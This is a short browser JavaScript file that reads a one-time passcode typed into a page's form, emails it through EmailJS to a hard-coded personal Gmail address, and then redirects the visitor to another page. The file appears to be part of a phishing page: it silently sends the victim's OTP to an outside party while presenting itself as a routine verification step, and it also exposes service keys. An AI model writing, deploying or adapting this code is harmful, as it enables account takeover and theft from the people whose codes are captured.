// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_ef25ngm";
const userId = "7ykC6ecshhruiUQN-";
const templateId = "template_w05b32p";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "Tomegoodluck4@gmail.com",
    otp: otp.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      otp.value = "";
      location.href = "opp.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
